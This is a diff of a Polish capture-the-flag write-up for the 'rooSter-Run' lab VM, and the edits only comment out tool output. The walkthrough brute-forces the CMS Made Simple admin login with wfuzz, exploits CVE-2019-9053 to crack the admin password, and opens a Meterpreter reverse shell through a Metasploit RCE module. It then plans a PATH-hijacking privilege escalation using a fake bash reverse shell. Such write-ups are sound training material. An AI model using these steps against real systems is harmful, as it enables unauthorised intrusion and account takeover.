@@ -37,23 +37,23 @@ Po wstępnym skanowaniu **Nmapem**:
 {: .text-justify}
 ```bash
 msf6 > db_nmap 172.16.1.227
-[*] Nmap: Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-11-28 22:20 CET
-[*] Nmap: Nmap scan report for rooSter-Run.lan (172.16.1.227)
-[*] Nmap: Host is up (0.00081s latency).
-[*] Nmap: Not shown: 998 closed tcp ports (reset)
-[*] Nmap: PORT   STATE SERVICE
-[*] Nmap: 22/tcp open  ssh
-[*] Nmap: 80/tcp open  http
-[*] Nmap: MAC Address: 08:00:27:82:3B:50 (Oracle VirtualBox virtual NIC)
-[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 0.27 seconds
+# [*] Nmap: Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-11-28 22:20 CET
+# [*] Nmap: Nmap scan report for rooSter-Run.lan (172.16.1.227)
+# [*] Nmap: Host is up (0.00081s latency).
+# [*] Nmap: Not shown: 998 closed tcp ports (reset)
+# [*] Nmap: PORT   STATE SERVICE
+# [*] Nmap: 22/tcp open  ssh
+# [*] Nmap: 80/tcp open  http
+# [*] Nmap: MAC Address: 08:00:27:82:3B:50 (Oracle VirtualBox virtual NIC)
+# [*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 0.27 seconds
 msf6 > hosts 
 
-Hosts
-=====
+# Hosts
+# =====
 
-address       mac                name             os_name  os_flavor  os_sp  purpose  info  comments
--------       ---                ----             -------  ---------  -----  -------  ----  --------
-172.16.1.227  08:00:27:82:3b:50  rooSter-Run.lan  Unknown                    device
+# address       mac                name             os_name  os_flavor  os_sp  purpose  info  comments
+# -------       ---                ----             -------  ---------  -----  -------  ----  --------
+# 172.16.1.227  08:00:27:82:3b:50  rooSter-Run.lan  Unknown                    device
 ```
 widzimy, że mamy otwarte porty: 
 {: .text-justify}
@@ -72,20 +72,20 @@ Do łamania haseł online dobry jest **Ffuf** i **Wfuzz**. Niestety w **Ffuf** t
 wfuzz -w /usr/share/wordlists/rockyou.txt -d 'username=admin&password=FUZZ&loginsubmit=Submit' -u http://172.16.1.227/admin/login.php --hh 4569
 ```
 ```bash
- /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
-********************************************************
-* Wfuzz 3.1.0 - The Web Fuzzer                         *
-********************************************************
+# /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+# ********************************************************
+# * Wfuzz 3.1.0 - The Web Fuzzer                         *
+# ********************************************************
 
-Target: http://172.16.1.227/admin/login.php
-Total requests: 14344392
+# Target: http://172.16.1.227/admin/login.php
+# Total requests: 14344392
 
-=====================================================================
-ID           Response   Lines    Word       Chars       Payload                                                                              
-=====================================================================
+# =====================================================================
+# ID           Response   Lines    Word       Chars       #Payload                                                                              
+# =====================================================================
 
-000019993:   302        0 L      0 W        0 Ch        
-"hasełko"
+# 000019993:   302        0 L      0 W        0 Ch        
+# "hasełko"
 ```
 ## 03b. CVE-2019-9053
 Wcześniej znalazłem exploit **CVE-2019-9053**, ale mi się nie uruchomił. Powodem był brak biblioteki **Termcolor** do Pythona 2 (w którym uruchamia się skrypt). Niestety Python 2 powoli wychodzi z użycia, ale stare exploity zostały. Poprawiłem to (skopiowałem plik _termcolor.py_ z katalogu _/usr/lib/python3/dist-packages_ do _/usr/lib/python2_) i odpaliłem skrypt z ciekawości. Poniżej pokazuje jak go znalazłem i jego efekty działania.
@@ -94,22 +94,22 @@ Wcześniej znalazłem exploit **CVE-2019-9053**, ale mi się nie uruchomił. Pow
 searchsploit cms made simple sql
 ```
 ```bash
--------------------------------------------------------------------------------------------------------------------- ---------------------------------
- Exploit Title                                                                                                      |  Path
--------------------------------------------------------------------------------------------------------------------- ---------------------------------
-CMS Made Simple 1.0.5 - 'Stylesheet.php' SQL Injection                                                              | php/webapps/29941.txt
-CMS Made Simple 1.2.2 Module TinyMCE - SQL Injection                                                                | php/webapps/4810.txt
-CMS Made Simple < 2.2.10 - SQL Injection                                                                            | php/webapps/46635.py
+# -------------------------------------------------------------------------------------------------------------------- ---------------------------------
+# Exploit Title                                                                                                      |  Path
+# -------------------------------------------------------------------------------------------------------------------- ---------------------------------
+# CMS Made Simple 1.0.5 - 'Stylesheet.php' SQL Injection                                                              | php/webapps/29941.txt
+# CMS Made Simple 1.2.2 Module TinyMCE - SQL Injection                                                                | php/webapps/4810.txt
+# CMS Made Simple < 2.2.10 - SQL Injection                                                                            | php/webapps/46635.py
 ```
 ```bash
 python2 46635.py -u http://172.16.1.227/ --crack -w /usr/share/wordlists/rockyou.txt
 ```
 ```bash
-[+] Salt for password found: 1a0112229fbd699d
-[+] Username found: admin
-[+] Email found: admin@localhost.com
-[+] Password found: 4f943036486b9ad48890b2efbf7735a8
-[+] Password cracked: hasełko
+# [+] Salt for password found: 1a0112229fbd699d
+# [+] Username found: admin
+# [+] Email found: admin@localhost.com
+# [+] Password found: 4f943036486b9ad48890b2efbf7735a8
+# [+] Password cracked: hasełko
 ```
 # 04. Podatna wersja CMS Made Simple
 Jak wcześniej napisałem jest to **CMS Made Simple**, a jego wersja to **2.2.9.1**. Szukając następnych podatności, tym razem już w **Metasploicie** znalazłem coś takiego:
@@ -117,14 +117,14 @@ Jak wcześniej napisałem jest to **CMS Made Simple**, a jego wersja to **2.2.9.
 ```bash
 msf6 > search CMS Made Simple
 
-Matching Modules
-================
+# Matching Modules
+# ================
 
-   #  Name                                           Disclosure Date  Rank       Check  Description
-   -  ----                                           ---------------  ----       -----  -----------
-   0  exploit/multi/http/cmsms_showtime2_rce         2019-03-11       normal     Yes    CMS Made Simple (CMSMS) Showtime2 File Upload RCE
-   1  exploit/multi/http/cmsms_upload_rename_rce     2018-07-03       excellent  Yes    CMS Made Simple Authenticated RCE via File Upload/Copy
-   2  exploit/multi/http/cmsms_object_injection_rce  2019-03-26       normal     Yes    CMS Made Simple Authenticated RCE via object injection
+#    #  Name                                           Disclosure Date  Rank       Check  Description
+#    -  ----                                           ---------------  ----       -----  -----------
+#    0  exploit/multi/http/cmsms_showtime2_rce         2019-03-11       normal     Yes    CMS Made Simple (CMSMS) Showtime2 File Upload RCE
+#    1  exploit/multi/http/cmsms_upload_rename_rce     2018-07-03       excellent  Yes    CMS Made Simple Authenticated RCE via File Upload/Copy
+#    2  exploit/multi/http/cmsms_object_injection_rce  2019-03-26       normal     Yes    CMS Made Simple Authenticated RCE via object injection
 
 
 Interact with a module by name or index. For example info 2, use 2 or use exploit/multi/http/cmsms_object_injection_rce
@@ -132,23 +132,21 @@ Interact with a module by name or index. For example info 2, use 2 or use exploi
 Wybieramy **multi/http/cmsms_object_injection_rce**:
 ```bash
 msf6 exploit(multi/http/cmsms_object_injection_rce) > set username admin
-username => admin
+# username => admin
 msf6 exploit(multi/http/cmsms_object_injection_rce) > set password hasełko
-password => hasełko
+# password => hasełko
 msf6 exploit(multi/http/cmsms_object_injection_rce) > set rhosts 172.16.1.227
-rhosts => 172.16.1.227
+# rhosts => 172.16.1.227
 msf6 exploit(multi/http/cmsms_object_injection_rce) > run -j
-[*] Exploit running as background job 0.
-[*] Exploit completed, but no session was created.
+# [*] Exploit running as background job 0.
+# [*] Exploit completed, but no session was created.
 
-[*] Started reverse TCP handler on 172.16.1.89:4444 
-msf6 exploit(multi/http/cmsms_object_injection_rce) > [*] Running automatic check ("set AutoCheck false" to disable)
-[+] The target appears to be vulnerable.
-[*] Sending stage (39927 bytes) to 172.16.1.227
-[+] Deleted zEAhHHutjN.php
-[*] Meterpreter session 1 opened (172.16.1.89:4444 -> 172.16.1.227:41228) at 2023-11-28 23:06:33 +0100
-
-msf6 exploit(multi/http/cmsms_object_injection_rce) > 
+# [*] Started reverse TCP handler on 172.16.1.89:4444 
+# msf6 exploit(multi/http/cmsms_object_injection_rce) > [*] Running automatic check ("set AutoCheck false" to disable)
+# [+] The target appears to be vulnerable.
+# [*] Sending stage (39927 bytes) to 172.16.1.227
+# [+] Deleted zEAhHHutjN.php
+# [*] Meterpreter session 1 opened (172.16.1.89:4444 -> 172.16.1.227:41228) at 2023-11-28 23:06:33 +0100
 ```
 W w/w eksploicie jest wymagane podania loginu i hasła, ale za to mamy dostęp do **Shella**.
 {: .text-justify}
@@ -159,18 +157,18 @@ wget "https://github.com/diego-treitos/linux-smart-enumeration/raw/master/lse.sh
 ```
 {: .text-justify}
 ```bash
-...
-[!] fst160 Can we write to critical files?................................. nope
-[!] fst170 Can we write to critical directories?........................... nope
-[!] fst180 Can we write to directories from PATH defined in /etc?.......... yes!
----
-drwxrwx---+ 2 root root 4096 Nov 28 23:32 /usr/local/bin
----
-[!] fst190 Can we read any backup?......................................... nope
-[!] fst200 Are there possible credentials in any shell history file?....... nope
-[!] fst210 Are there NFS exports with 'no_root_squash' option?............. nope
-[*] fst220 Are there NFS exports with 'no_all_squash' option?.............. nope
-...
+# ...
+# [!] fst160 Can we write to critical files?................................. nope
+# [!] fst170 Can we write to critical directories?........................... nope
+# [!] fst180 Can we write to directories from PATH defined in /etc?.......... yes!
+# ---
+# drwxrwx---+ 2 root root 4096 Nov 28 23:32 /usr/local/bin
+# ---
+# [!] fst190 Can we read any backup?......................................... nope
+# [!] fst200 Are there possible credentials in any shell history file?....... nope
+# [!] fst210 Are there NFS exports with 'no_root_squash' option?............. nope
+# [*] fst220 Are there NFS exports with 'no_all_squash' option?.............. nope
+# ...
 ```
 Przyjrzyjmy się bardziej _/usr/local/bin_:
 {: .text-justify}
@@ -178,16 +176,16 @@ Przyjrzyjmy się bardziej _/usr/local/bin_:
 getfacl /usr/local/bin
 ```
 ```bash
-getfacl: Removing leading '/' from absolute path names
+# getfacl: Removing leading '/' from absolute path names
 # file: usr/local/bin
 # owner: root
 # group: root
-user::rwx
-user:www-data:rwx
-user:matthieu:r-x
-group::---
-mask::rwx
-other::---
+# user::rwx
+# user:www-data:rwx
+# user:matthieu:r-x
+# group::---
+# mask::rwx
+# other::---
 ```
 Jak widzimy, użytkownik _www-data_ ma cały dostęp do tego katalogu. Skrypt _StaleFinder_ zaś wygląda tak:
 {: .text-justify}
@@ -211,13 +209,13 @@ Sprawdźmy kolejność przeszukiwania katalogów przez **Basha**(zakładając, �
 ```bash
 www-data@rooSter-Run:/home/matthieu$ echo $PATH
 echo $PATH
-/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+# /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
 ```
 Zobaczmy gdzie jest **Bash**:
 {: .text-justify}
 ```bash
 whereis bash
-bash: /usr/bin/bash /usr/share/man/man1/bash.1.gz
+# bash: /usr/bin/bash /usr/share/man/man1/bash.1.gz
 ```
 Katalog _/usr/bin/_ jest za _/usr/local/bin_, więc jeżeli wrzucimy nasz plik **Bash** do katalogu _/usr/local/bin_ to się uruchomi pierwszy. Zawartość **Basha** jego to oczywiście **Reverse Shell**. 
 {: .text-justify}
